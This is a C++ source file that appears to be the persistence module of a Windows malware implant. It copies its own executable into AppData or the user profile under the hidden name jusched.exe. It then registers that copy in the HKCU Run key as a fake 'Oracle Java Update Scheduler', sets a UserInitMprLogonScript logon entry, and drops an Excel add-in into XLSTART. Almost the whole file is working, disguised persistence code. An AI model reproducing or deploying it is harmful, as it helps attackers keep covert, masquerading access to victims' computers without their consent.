#include "Persistence.h"

LPCSTR Persist(DWORD method){

	switch(method){
		case PERSIST_RUNKEY:
			if(PersistRunKey()){
				return "[+] Run key Persistence Successfull [+]";
			}
		case PERSIST_LOGONSCRIPT:
			if(PersistLogonScript()){
				return "[+] Logon script Persistence Successfull [+]";
			}
		case PERSIST_EXCELADDIN:
			if(PersistExcelAddin()){
				return "[+] Excel addin Persistence Successfull [+]";
			}
	}
	return "[-] Persistence failed [-]";
}


BOOL PersistRunKey(){
	
	LPSTR cFile = new CHAR[MAX_PATH+1];
	LPSTR fDestination = new CHAR[MAX_PATH+1];
	LPSTR appdata = new CHAR[MAX_PATH+1];
	GetEnvironmentVariable("appdata",appdata,MAX_PATH);

	StringCbPrintf(fDestination,MAX_PATH,"%s\\jusched.exe",appdata);

	GetModuleFileName(NULL,cFile,MAX_PATH);
	if(CopyFile(cFile,fDestination,TRUE) != 0){
		SetFileAttributes(fDestination,FILE_ATTRIBUTE_HIDDEN);
		HKEY hKey;
		RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
		RegSetValueEx(hKey,"Oracle Java Update Scheduler",0,REG_SZ,(LPBYTE)(LPCSTR)fDestination,MAX_PATH);
		RegCloseKey(hKey);
		return TRUE;
		
	}
	return FALSE;
}


BOOL PersistLogonScript(){

	LPSTR cFile = new CHAR[MAX_PATH+1];
	LPSTR fDestination = new CHAR[MAX_PATH+1];
	LPSTR userProfile = new CHAR[MAX_PATH+1];
	GetEnvironmentVariable("userprofile",userProfile,MAX_PATH);
	StringCbPrintf(fDestination,MAX_PATH,"%s\\jusched.exe",userProfile);
	GetModuleFileName(NULL,cFile,MAX_PATH);
	if(CopyFile(cFile,fDestination,TRUE) != 0){
		SetFileAttributes(fDestination,FILE_ATTRIBUTE_HIDDEN);
		HKEY hKey;
		RegOpenKey(HKEY_CURRENT_USER,"Environment",&hKey);
		RegSetValueEx(hKey,"UserInitMprLogonScript",0,REG_SZ,(LPBYTE)(LPCSTR)fDestination,MAX_PATH);
		RegCloseKey(hKey);
		return TRUE;
	}
	return FALSE;



}


BOOL PersistExcelAddin(){

	LPSTR appData = new CHAR[MAX_PATH+1];
	LPSTR fileDest = new CHAR[MAX_PATH+1];
	
	GetEnvironmentVariable("appdata",appData,MAX_PATH);
	StringCbPrintf(fileDest,MAX_PATH,"%s\\Microsoft\\Excel\\XLSTART",appData);

	
	if(PathFileExists(fileDest)){
		StringCbPrintf(fileDest,MAX_PATH,"%s\\XLS_ADDIN.xlam",fileDest);
		DropFileFromRes(fileDest,IDR_RCDATA1);
		LPSTR cFile = new CHAR[MAX_PATH+1];
		LPSTR fDestination = new CHAR[MAX_PATH+1];
		LPSTR appData = new CHAR[MAX_PATH+1];
		GetEnvironmentVariable("appdata",appData,MAX_PATH);
		StringCbPrintf(fDestination,MAX_PATH,"%s\\jsched.exe",appData);
		GetModuleFileName(NULL,cFile,MAX_PATH);
		if(CopyFile(cFile,fDestination,TRUE) != 0){
			SetFileAttributes(fDestination,FILE_ATTRIBUTE_HIDDEN);
			return TRUE;
		}
	}

	return FALSE;
}